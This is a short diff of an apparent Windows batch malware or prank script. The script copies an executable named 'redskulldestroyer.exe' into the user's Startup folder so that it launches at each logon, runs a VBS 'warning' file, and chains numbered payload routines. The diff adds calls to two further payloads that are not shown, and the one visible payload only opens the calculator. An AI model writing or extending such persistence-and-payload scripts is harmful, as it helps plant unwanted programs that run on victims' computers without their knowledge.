@@ -2,6 +2,8 @@
 copy redskulldestroyer.exe "%USERPROFILE%\Start Menu\Programs\Startup"
 warning.vbs
 call :payload1
+call :payload2
+call :payload3
 
 :payload1
 calc
